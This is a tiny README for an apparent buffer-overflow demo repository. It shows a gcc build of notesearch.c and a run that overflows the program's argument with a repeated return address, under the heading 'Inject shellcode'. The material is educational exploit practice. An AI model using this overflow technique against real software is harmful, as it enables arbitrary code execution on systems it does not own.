# buffers-demos


Inject shellcode:
```c
gcc -g -o notesearch notesearch.c 

./notesearch $(perl -e 'print "\xb4\xcd\xed\x30"*20')
```